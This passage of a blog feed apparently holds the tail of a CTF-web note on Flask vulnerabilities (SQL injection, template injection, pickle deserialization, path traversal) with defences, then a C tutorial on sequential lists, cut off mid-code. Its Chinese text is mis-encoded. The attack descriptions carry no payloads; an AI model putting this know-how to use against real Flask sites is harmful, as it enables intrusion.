è¯­å¥ï¼ŒæŸ¥è¯¢ã€ä¿®æ”¹ç”šè‡³åˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚é˜²å¾¡æªæ–½æ˜¯ä½¿ç”¨ ORM å·¥å…·ï¼Œå¦‚ SQLAlchemyï¼Œé¿å…ç›´æ¥æ‹¼æ¥ SQL å­—ç¬¦ä¸²ã€‚</p></li><li><p>**è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)**ï¼šFlask ä½¿ç”¨ <code>render_template_string</code> æ—¶ï¼Œå®¹æ˜“å—åˆ°æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚æ”»å‡»è€…é€šè¿‡æ³¨å…¥æ¶æ„æ¨¡æ¿è¡¨è¾¾å¼å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚é˜²å¾¡æªæ–½æ˜¯é¿å…æ¸²æŸ“ç”¨æˆ·è¾“å…¥çš„æ¨¡æ¿ï¼Œä½¿ç”¨ä¸¥æ ¼çš„æ¨¡æ¿æ¸²æŸ“æ¨¡å¼ã€‚</p></li><li><p><strong>ååºåˆ—åŒ–æ¼æ´</strong>ï¼šå½“ Flask ä½¿ç”¨ <code>pickle</code> ç­‰ååºåˆ—åŒ–åº“æ—¶ï¼Œå®¹æ˜“å—åˆ°ååºåˆ—åŒ–æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚é˜²å¾¡æªæ–½æ˜¯é¿å…ä½¿ç”¨ä¸å®‰å…¨çš„åºåˆ—åŒ–æ–¹æ³•ï¼Œæ¨èä½¿ç”¨ JSON ä½œä¸ºåºåˆ—åŒ–æ–¹å¼ã€‚</p></li><li><p><strong>è·¯å¾„éå†æ¼æ´</strong>ï¼šFlask ä¸­çš„è·¯å¾„éå†æ”»å‡»å‘ç”Ÿåœ¨å¤„ç†æ–‡ä»¶è·¯å¾„æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„æ–‡ä»¶è·¯å¾„è®¿é—®æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚é˜²å¾¡æªæ–½æ˜¯ç¡®ä¿æ–‡ä»¶</p></li></ol><p>è·¯å¾„çš„åˆæ³•æ€§ï¼Œä½¿ç”¨ <code>secure_filename</code> å’Œ <code>safe_join</code> å‡½æ•°æ¥é˜²æ­¢è·¯å¾„éå†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>åŸºç¡€ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfweb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cè¯­è¨€çš„æ•°æ®ç»“æ„</title>
    <link href="/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="cè¯­è¨€çš„æ•°æ®ç»“æ„"><a href="#cè¯­è¨€çš„æ•°æ®ç»“æ„" class="headerlink" title="cè¯­è¨€çš„æ•°æ®ç»“æ„"></a>cè¯­è¨€çš„æ•°æ®ç»“æ„</h1><h2 id="é¡ºåºè¡¨"><a href="#é¡ºåºè¡¨" class="headerlink" title="é¡ºåºè¡¨"></a>é¡ºåºè¡¨</h2><p>é¡ºåºè¡¨æ˜¯ä¸€ç§çº¿æ€§è¡¨ï¼Œå…¶å…ƒç´ åœ¨å†…å­˜ä¸­è¿ç»­å­˜æ”¾ï¼Œå¯ä»¥é€šè¿‡æ•°ç»„æ¥å®ç°ã€‚</p><p>é¡ºåºè¡¨æ˜¯ä¸€ç§é¡ºåºå­˜å‚¨çš„çº¿æ€§è¡¨ï¼Œå…¶ç‰¹ç‚¹å¦‚ä¸‹ï¼š</p><ol><li><p><strong>æ•°ç»„ä¸‹æ ‡ä¸å…ƒç´ ä½ç½®çš„å…³ç³»ï¼š</strong></p><ul><li>æ•°ç»„ä¸‹æ ‡ä»0å¼€å§‹ï¼Œæ¯ä¸ªå…ƒç´ çš„ç´¢å¼•ä¸å…¶åœ¨æ•°ç»„ä¸­çš„ç‰©ç†ä½ç½®ç›¸å¯¹åº”ã€‚</li></ul></li><li><p><strong>å†…å­˜åœ°å€çš„è®¡ç®—å…¬å¼ï¼š</strong></p><ul><li>å¯¹äºä¸€ä¸ªé•¿åº¦ä¸ºnçš„é¡ºåºè¡¨Aï¼Œå…¶ä¸­ç¬¬iä¸ªå…ƒç´ ï¼ˆå‡è®¾ç±»å‹ä¸ºElemTypeï¼‰çš„å†…å­˜åœ°å€å¯ä»¥é€šè¿‡ä»¥ä¸‹å…¬å¼è®¡ç®—å¾—å‡ºï¼š<br>[LOC(A[i]) &#x3D; LOC(A[0]) + sizeof(ElemType) * i]<br>å…¶ä¸­ï¼š</li><li>(LOC(A[0])) æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå³æ•°ç»„ä¸‹æ ‡ä¸º0çš„å…ƒç´ ï¼‰çš„å†…å­˜åœ°å€ã€‚</li><li>(sizeof(ElemType)) è¡¨ç¤ºå…ƒç´ ç±»å‹çš„å­—èŠ‚å¤§å°ã€‚</li><li>(i) æ˜¯å½“å‰å…ƒç´ çš„æ•°ç»„ä¸‹æ ‡ã€‚</li></ul></li><li><p><strong>ç¤ºä¾‹åˆ†æï¼š</strong></p><ul><li>å‡è®¾æœ‰ä¸€ä¸ªæ•´å‹æ•°ç»„Aï¼Œå…¶èµ·å§‹åœ°å€ä¸º1000ï¼Œä¸”æ¯ä¸ªæ•´æ•°å ç”¨4ä¸ªå­—èŠ‚çš„ç©ºé—´ã€‚</li><li>åˆ™ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå³æ•°ç»„ä¸‹æ ‡ä¸º1çš„å…ƒç´ ï¼‰çš„å†…å­˜åœ°å€å¯ä»¥è®¡ç®—ä¸ºï¼š<br>[LOC(A[1]) &#x3D; 1000 + 4 * 1 &#x3D; 1004]<br>é€šè¿‡ä¸Šè¿°ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿åœ°è®¿é—®é¡ºåºè¡¨ä¸­ä»»æ„ä½ç½®çš„å…ƒç´ ï¼Œåªéœ€çŸ¥é“æ•°ç»„çš„èµ·å§‹åœ°å€ã€å…ƒç´ ç±»å‹ä»¥åŠç›®æ ‡å…ƒç´ çš„ç´¢å¼•å³å¯ã€‚</li></ul></li><li><p>å…³äºcè¯­è¨€çš„åŸºç¡€ï¼š</p><ol><li><p><strong>ä¼ å…¥æŒ‡é’ˆï¼ˆä¾‹å¦‚ <code>SeqList *list</code>ï¼‰</strong></p><ul><li>å½“ä½ ä¼ å…¥ <code>SeqList *list</code> æ—¶ï¼Œè¡¨ç¤ºä½ ä¼ é€’çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ˆä¹Ÿå°±æ˜¯ <code>list</code> çš„åœ°å€ï¼‰ã€‚</li><li>ä¼ é€’æŒ‡é’ˆçš„å¥½å¤„æ˜¯ä½ å¯ä»¥ç›´æ¥åœ¨å‡½æ•°å†…éƒ¨ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹ã€‚</li><li>ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ <code>InitList()</code> å‡½æ•°ä¸­ï¼Œä½ ä¼ å…¥äº† <code>SeqList *list</code>ï¼Œå› ä¸ºä½ éœ€è¦ä¿®æ”¹ <code>list-&gt;length</code> çš„å€¼ï¼Œè€Œä¸æ˜¯ä¿®æ”¹ä¸€ä¸ªå‰¯æœ¬ã€‚</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">void</span> InitList(SeqList *list) &#123;<br>    list-&gt;<span class="hljs-built_in">length</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// ç›´æ¥ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„ä½“çš„æˆå‘˜</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>ä¼ å…¥ç»“æ„ä½“ï¼ˆä¾‹å¦‚ <code>SeqList list</code>ï¼‰</strong></p><ul><li>å¦‚æœä½ ä¼ å…¥çš„æ˜¯ <code>SeqList list</code>ï¼Œé‚£ä¹ˆä¼ é€’çš„æ˜¯æ•´ä¸ªç»“æ„ä½“çš„å‰¯æœ¬ã€‚</li><li>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‡½æ•°å†…å¯¹ <code>list</code> çš„ä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå½±å“åˆ°åŸå§‹çš„ç»“æ„ä½“ï¼Œå› ä¸ºå‡½æ•°åªæ˜¯å¯¹ <code>list</code> è¿›è¡Œäº†å€¼ä¼ é€’ï¼ŒåŸæ¥çš„æ•°æ®å¹¶æ²¡æœ‰è¢«æ”¹å˜ã€‚</li><li>ä¾‹å¦‚ï¼Œå¦‚æœä½ ç”¨ä¸‹é¢çš„æ–¹å¼ä¼ é€’ <code>list</code>ï¼š</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">void</span> InitList(SeqList list) &#123;<br>    list.<span class="hljs-built_in">length</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// åªæ˜¯ä¿®æ”¹äº†å‰¯æœ¬ï¼Œä¸ä¼šå½±å“åˆ°åŸå§‹çš„é¡ºåºè¡¨</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="3-ä½¿ç”¨ç¤ºä¾‹å¯¹æ¯”"><a href="#3-ä½¿ç”¨ç¤ºä¾‹å¯¹æ¯”" class="headerlink" title="3. ä½¿ç”¨ç¤ºä¾‹å¯¹æ¯”"></a>3. ä½¿ç”¨ç¤ºä¾‹å¯¹æ¯”</h3><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªé¡ºåºè¡¨ï¼Œå¹¶å¸Œæœ›ä½¿ç”¨ä¸€ä¸ªå‡½æ•°åˆå§‹åŒ–å®ƒï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">SeqList list;<br><span class="hljs-built_in">InitList</span>(&amp;list); <span class="hljs-comment">// ä¼ é€’æŒ‡é’ˆï¼Œè¿™æ ·å‡½æ•°å¯ä»¥ä¿®æ”¹åŸå§‹ list çš„å†…å®¹</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>InitList()</code> å‡½æ•°ä¸­ï¼Œä¼ å…¥çš„æ˜¯ <code>&amp;list</code>ï¼Œè¿™æ˜¯ <code>list</code> çš„åœ°å€ï¼Œæ‰€ä»¥ <code>InitList()</code> å‡½æ•°æ¥æ”¶çš„æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>SeqList</code> çš„æŒ‡é’ˆï¼ˆ<code>SeqList *list</code>ï¼‰ã€‚</p><ul><li>åœ¨å‡½æ•°å†…éƒ¨ï¼Œ<code>list</code> æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘äº†åŸå§‹çš„ <code>SeqList</code> å˜é‡ã€‚</li><li>ä½¿ç”¨ <code>list-&gt;length</code> å¯ä»¥ç›´æ¥ä¿®æ”¹åŸå§‹é¡ºåºè¡¨ä¸­çš„ <code>length</code> å€¼ã€‚</li></ul><p>è€Œå¦‚æœä½ ä¼ é€’ <code>SeqList list</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">SeqList list;<br><span class="hljs-built_in">InitList</span>(list); <span class="hljs-comment">// ä¼ é€’çš„æ˜¯ç»“æ„ä½“çš„å‰¯æœ¬</span><br></code></pre></td></tr></table></figure><p>è¿™æ · <code>InitList()</code> å‡½æ•°æ¥æ”¶çš„æ˜¯ <code>SeqList list</code>ï¼Œå®ƒåªæ˜¯åŸå§‹æ•°æ®çš„å‰¯æœ¬ï¼Œä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå½±å“åŸå§‹çš„ <code>list</code>ã€‚</p><h3 id="4-ä¸ºä»€ä¹ˆè¦ä¼ é€’æŒ‡é’ˆï¼Ÿ"><a href="#4-ä¸ºä»€ä¹ˆè¦ä¼ é€’æŒ‡é’ˆï¼Ÿ" class="headerlink" title="4. ä¸ºä»€ä¹ˆè¦ä¼ é€’æŒ‡é’ˆï¼Ÿ"></a>4. ä¸ºä»€ä¹ˆè¦ä¼ é€’æŒ‡é’ˆï¼Ÿ</h3><p>ä¼ é€’æŒ‡é’ˆçš„ä¸»è¦åŸå› æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li><strong>ä¿®æ”¹åŸå§‹æ•°æ®</strong>ï¼šé€šè¿‡ä¼ é€’æŒ‡é’ˆï¼Œä½ å¯ä»¥åœ¨å‡½æ•°å†…éƒ¨ä¿®æ”¹åŸå§‹æ•°æ®ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¿®æ”¹å‰¯æœ¬ã€‚</li><li><strong>æé«˜æ•ˆç‡</strong>ï¼šä¼ é€’ä¸€ä¸ªæŒ‡é’ˆæ¯”ä¼ é€’æ•´ä¸ªç»“æ„ä½“æ›´åŠ é«˜æ•ˆï¼Œç‰¹åˆ«æ˜¯å½“ç»“æ„ä½“è¾ƒå¤§æ—¶ï¼Œä¼ é€’å‰¯æœ¬ä¼šæµªè´¹å¤§é‡çš„å†…å­˜å’Œæ—¶é—´ã€‚</li></ol></li></ol><p>ä»£ç çš„å®ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100  <span class="hljs-comment">// å®šä¹‰é¡ºåºè¡¨çš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-comment">// é¡ºåºè¡¨ç»“æ„ä½“</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// ç”¨äºå­˜å‚¨å…ƒç´ çš„æ•°ç»„</span><br>    <span class="hljs-type">int</span> length;         <span class="hljs-comment">// é¡ºåºè¡¨çš„å½“å‰é•¿åº¦</span><br>&#125; SeqList;<br><span class="hljs-comment">// åˆå§‹åŒ–é¡ºåºè¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-built_in">list</span>-&gt;length = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// æ‰“å°é¡ºåºè¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(SeqList <span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>.length; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, <span class="hljs-built_in">list</span>.data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// åœ¨é¡ºåºè¡¨ä¸­æ’å…¥å…ƒç´ </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">1</span> || pos &gt; <span class="hljs-built_in">list</span>-&gt;length + <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ’å…¥ä½ç½®ä¸åˆæ³•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// æ’å…¥ä½ç½®ä¸åˆæ³•</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>-&gt;length &gt;= MAX_SIZE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é¡ºåºè¡¨å·²æ»¡ï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// é¡ºåºè¡¨å·²æ»¡</span><br>    &#125;<br>    <span class="hljs-comment">// ä»æœ€åä¸€ä¸ªå…ƒç´ å¼€å§‹ï¼Œå‘åç§»åŠ¨æ•°æ®</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-built_in">list</span>-&gt;length; i &gt;= pos; i--) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i] = <span class="hljs-built_in">list</span>-&gt;data[i - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;data[pos - <span class="hljs-number">1</span>] = value; <span class="hljs-comment">// æ’å…¥å…ƒç´ </span><br>    <span class="hljs-built_in">list</span>-&gt;length++;              <span class="hljs-comment">// è¡¨é•¿åº¦å¢åŠ </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// åˆ é™¤é¡ºåºè¡¨ä¸­çš„å…ƒç´ </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> pos)</span> &#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">1</span> || pos &gt; <span class="hljs-built_in">list</span>-&gt;length) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤ä½ç½®ä¸åˆæ³•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// åˆ é™¤ä½ç½®ä¸åˆæ³•</span><br>    &#125;<br>    <span class="hljs-comment">// ä»åˆ é™¤ä½ç½®å¼€å§‹ï¼Œå‘å‰ç§»åŠ¨æ•°æ®</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = pos; i &lt; <span class="hljs-built_in">list</span>-&gt;length; i++) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i - <span class="hljs-number">1</span>] = <span class="hljs-built_in">list</span>-&gt;data[i];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;length--; <span class="hljs-comment">// è¡¨é•¿åº¦å‡å°‘</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// æŸ¥æ‰¾é¡ºåºè¡¨ä¸­çš„å…ƒç´ </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Find</span><span class="hljs-params">(SeqList <span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>.data[i] == value) &#123;<br>            <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>; <span class="hljs-comment">// è¿”å›å…ƒç´ çš„ä½ç½®ï¼ˆä»1å¼€å§‹ï¼‰</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// æœªæ‰¾åˆ°</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    SeqList <span class="hljs-built_in">list</span>;<br>    <span class="hljs-comment">// åˆå§‹åŒ–é¡ºåºè¡¨</span><br>    InitList(&amp;<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// æ’å…¥å…ƒç´ </span><br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>, <span class="hljs-number">20</span>);<br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>, <span class="hljs-number">30</span>);<br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>);<br>    <span class="hljs-comment">// æ‰“å°é¡ºåºè¡¨</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é¡ºåºè¡¨çš„å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// æŸ¥æ‰¾å…ƒç´ </span><br>    <span class="hljs-type">int</span> pos = Find(<span class="hljs-built_in">list</span>, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">if</span> (pos != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å…ƒç´ 20çš„ä½ç½®æ˜¯ï¼š%d\n&quot;</span>, pos);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°å…ƒç´ 20\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// åˆ é™¤å…ƒç´ </span><br>    Delete(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-comment">// æ‰“å°é¡ºåºè¡¨</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤å…ƒç´ åçš„é¡ºåºè¡¨ä¸ºï¼š&quot;</span>);<br>    PrintList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//è¿™é‡Œæ˜¯è¿ç”¨åŠ¨æ€åˆ†é…å†™çš„ä»£ç </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰é¡ºåºè¡¨ç»“æ„ä½“</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> *data;    <span class="hljs-comment">// æŒ‡å‘åŠ¨æ€åˆ†é…çš„æ•°ç»„</span><br>    <span class="hljs-type">int</span> size;     <span class="hljs-comment">// å½“å‰é¡ºåºè¡¨çš„å¤§å°</span><br>    <span class="hljs-type">int</span> capacity; <span class="hljs-comment">// é¡ºåºè¡¨çš„å®¹é‡</span><br>&#125; SeqList;<br><span class="hljs-comment">// åˆå§‹åŒ–é¡ºåºè¡¨</span><br>SeqList* <span class="hljs-title function_">initSeqList</span><span class="hljs-params">(<span class="hljs-type">int</span> initialCapacity)</span> &#123;<br>    SeqList *<span class="hljs-built_in">list</span> = (SeqList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(SeqList));<br>    <span class="hljs-built_in">list</span>-&gt;data = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(initialCapacity * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-built_in">list</span>-&gt;size = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">list</span>-&gt;capacity = initialCapacity;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>;<br>&#125;<br><span class="hljs-comment">// æ‰©å±•é¡ºåºè¡¨å®¹é‡</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">expandCapacity</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-type">int</span> newCapacity = <span class="hljs-built_in">list</span>-&gt;capacity * <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> *newData = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">realloc</span>(<span class="hljs-built_in">list</span>-&gt;data, newCapacity * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span> (newData != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data = newData;<br>        <span class="hljs-built_in">list</span>-&gt;capacity = newCapacity;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span 